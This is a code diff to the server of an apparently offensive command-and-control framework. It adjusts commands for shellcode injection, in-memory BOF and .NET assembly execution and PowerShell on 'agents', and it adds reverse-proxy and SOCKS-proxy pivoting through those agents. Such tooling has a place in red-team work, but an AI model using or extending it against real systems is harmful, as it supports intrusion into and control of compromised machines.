@@ -103,6 +103,10 @@ class RemoteCLIServer:
 
         # Start the agent broadcast thread
         self._start_agent_broadcast_thread()
+
+        # Dictionary to store active reverse proxy connections for agents
+        self.reverse_proxy_connections = {}  # agent_id -> list of client connections
+        self.reverse_proxy_locks = {}  # agent_id -> threading.Lock
     
     def _start_agent_broadcast_thread(self):
         self.agent_broadcast_stop_event = threading.Event()
@@ -580,7 +584,7 @@ class RemoteCLIServer:
         module_name = "pinject"
 
         if len(command_parts) < 2:
-            return "USAGE: pinject <shellcode> [agent_id=<agent_id>]", 'error'
+            return "USAGE: pinject <shellcode_file> [agent_id=<agent_id>]", 'error'
 
         try:
             db = session.agent_manager.db if session.agent_manager else self.db
@@ -602,37 +606,9 @@ class RemoteCLIServer:
                         key, value = part.split('=', 1)
                         options[key] = value
 
-            # Check if shellcode is a file path and try to read it from server's external directory
+            # The client should send base64 encoded content directly, no server-side file resolution
+            # The shellcode_value is already base64 encoded content from the client
             shellcode_value = options.get('shellcode', '')
-            if shellcode_value and os.path.exists(shellcode_value):
-                # This is a file path, read the content
-                try:
-                    with open(shellcode_value, 'r') as f:
-                        file_content = f.read().strip()
-                    options['shellcode'] = file_content  # Replace with file content
-                except Exception as e:
-                    return f"Failed to read server-side file {shellcode_value}: {str(e)}", 'error'
-            elif shellcode_value:  # Check for file in modules/external directory
-                # Try to find the file in the external directory
-                possible_paths = [
-                    os.path.join('modules', 'external', shellcode_value),
-                    os.path.join('modules', 'external', 'shellcode', shellcode_value),
-                    os.path.join(os.getcwd(), shellcode_value)
-                ]
-
-                found_file_path = None
-                for path in possible_paths:
-                    if os.path.exists(path):
-                        found_file_path = path
-                        break
-
-                if found_file_path:
-                    try:
-                        with open(found_file_path, 'r') as f:
-                            file_content = f.read().strip()
-                        options['shellcode'] = file_content  # Replace with file content
-                    except Exception as e:
-                        return f"Failed to read server-side file {found_file_path}: {str(e)}", 'error'
 
             if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                 options['agent_id'] = session.current_agent
@@ -769,7 +745,7 @@ class RemoteCLIServer:
         module_name = "pwsh"
 
         if len(command_parts) < 2:
-            return "USAGE: pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]", 'error'
+            return "USAGE: pwsh <script_file> [agent_id=<agent_id>] [arguments=<script_arguments>]", 'error'
 
         try:
             db = session.agent_manager.db if session.agent_manager else self.db
@@ -926,7 +902,7 @@ class RemoteCLIServer:
         module_name = "execute-bof"
 
         if len(command_parts) < 2:
-            return "USAGE: execute-bof <bof_path> [arguments] [agent_id=<agent_id>]", 'error'
+            return "USAGE: execute-bof <bof_file> [arguments] [agent_id=<agent_id>]", 'error'
 
         try:
             db = session.agent_manager.db if session.agent_manager else self.db
@@ -1090,7 +1066,7 @@ class RemoteCLIServer:
         module_name = "execute-assembly"
 
         if len(command_parts) < 2:
-            return "USAGE: execute-assembly <assembly_path> [agent_id=<agent_id>]", 'error'
+            return "USAGE: execute-assembly <assembly_file> [agent_id=<agent_id>]", 'error'
 
         try:
             db = session.agent_manager.db if session.agent_manager else self.db
@@ -6272,6 +6248,138 @@ DB Inactive:       {stats['db_inactive_agents']}
                             result, status = f"Unknown event action: {action}. Use: list, search, stats, monitor, stop_monitor", 'error'
                     except Exception as e:
                         result, status = f"Error retrieving events: {str(e)}", 'error'
+            elif base_cmd == 'reverse_proxy':
+                if len(command_parts) < 2:
+                    result = "Usage: reverse_proxy <start|stop> [agent_id] [port]"
+                    status = 'error'
+                else:
+                    action = command_parts[1].lower()
+                    agent_id = None
+                    port = 5555  # Default port
+
+                    # Look for agent_id in command parts
+                    for i, part in enumerate(command_parts[2:], 2):
+                        if not part.startswith('-') and '=' not in part:
+                            if self.agent_manager.get_agent(part):  # Check if this looks like an agent ID
+                                agent_id = part
+                                # Check if there's a port specified after the agent ID
+                                if i + 1 < len(command_parts):
+                                    try:
+                                        port = int(command_parts[i + 1])
+                                        if not (1 <= port <= 65535):
+                                            result = f"Port must be between 1 and 65535, got: {port}"
+                                            status = 'error'
+                                            return {'output': result, 'status': status}
+                                    except ValueError:
+                                        pass  # Not a valid port number
+                                break
+                        elif '=' in part:
+                            key, value = part.split('=', 1)
+                            if key == 'agent_id':
+                                agent_id = value
+                            elif key == 'port':
+                                try:
+                                    port = int(value)
+                                    if not (1 <= port <= 65535):
+                                        result = f"Port must be between 1 and 65535, got: {port}"
+                                        status = 'error'
+                                        return {'output': result, 'status': status}
+                                except ValueError:
+                                    result = f"Invalid port number: {value}"
+                                    status = 'error'
+                                    return {'output': result, 'status': status}
+
+                    if not agent_id and remote_session.current_agent:
+                        agent_id = remote_session.current_agent
+
+                    if not agent_id:
+                        result = "No agent specified and no current agent in interactive mode"
+                        status = 'error'
+                        return {'output': result, 'status': status}
+
+                    if action == 'start':
+                        if self.agent_manager.start_reverse_proxy(agent_id, port):
+                            result = f"[+] Reverse proxy started for agent {agent_id} on port {port}"
+                            status = 'success'
+                        else:
+                            result = f"[-] Failed to start reverse proxy for agent {agent_id}"
+                            status = 'error'
+                    elif action == 'stop':
+                        if self.agent_manager.stop_reverse_proxy(agent_id):
+                            result = f"[+] Reverse proxy stopped for agent {agent_id}"
+                            status = 'success'
+                        else:
+                            result = f"[-] Failed to stop reverse proxy for agent {agent_id}"
+                            status = 'error'
+                    else:
+                        result = f"Unknown reverse_proxy action: {action}. Use: start, stop"
+                        status = 'error'
+            elif base_cmd == 'cli_socks_proxy':
+                if len(command_parts) < 2:
+                    result = "Usage: cli_socks_proxy <start|stop> [agent_id] [port]"
+                    status = 'error'
+                else:
+                    action = command_parts[1].lower()
+                    agent_id = None
+                    port = 1080  # Default CLI SOCKS port
+
+                    # Look for agent_id in command parts
+                    for i, part in enumerate(command_parts[2:], 2):
+                        if not part.startswith('-') and '=' not in part:
+                            if self.agent_manager.get_agent(part):  # Check if this looks like an agent ID
+                                agent_id = part
+                                # Check if there's a port specified after the agent ID
+                                if i + 1 < len(command_parts):
+                                    try:
+                                        port = int(command_parts[i + 1])
+                                        if not (1 <= port <= 65535):
+                                            result = f"Port must be between 1 and 65535, got: {port}"
+                                            status = 'error'
+                                            return {'output': result, 'status': status}
+                                    except ValueError:
+                                        pass  # Not a valid port number
+                                break
+                        elif '=' in part:
+                            key, value = part.split('=', 1)
+                            if key == 'agent_id':
+                                agent_id = value
+                            elif key == 'port':
+                                try:
+                                    port = int(value)
+                                    if not (1 <= port <= 65535):
+                                        result = f"Port must be between 1 and 65535, got: {port}"
+                                        status = 'error'
+                                        return {'output': result, 'status': status}
+                                except ValueError:
+                                    result = f"Invalid port number: {value}"
+                                    status = 'error'
+                                    return {'output': result, 'status': status}
+
+                    if not agent_id and remote_session.current_agent:
+                        agent_id = remote_session.current_agent
+
+                    if not agent_id:
+                        result = "No agent specified and no current agent in interactive mode"
+                        status = 'error'
+                        return {'output': result, 'status': status}
+
+                    if action == 'start':
+                        if self.agent_manager.start_cli_socks_proxy(agent_id, port):
+                            result = f"[+] CLI SOCKS proxy started for agent {agent_id} on port {port}"
+                            status = 'success'
+                        else:
+                            result = f"[-] Failed to start CLI SOCKS proxy for agent {agent_id}"
+                            status = 'error'
+                    elif action == 'stop':
+                        if self.agent_manager.stop_cli_socks_proxy(agent_id):
+                            result = f"[+] CLI SOCKS proxy stopped for agent {agent_id}"
+                            status = 'success'
+                        else:
+                            result = f"[-] Failed to stop CLI SOCKS proxy for agent {agent_id}"
+                            status = 'error'
+                    else:
+                        result = f"Unknown cli_socks_proxy action: {action}. Use: start, stop"
+                        status = 'error'
             else:
                 result, status = self.handle_neoc2_command(command, remote_session)
             
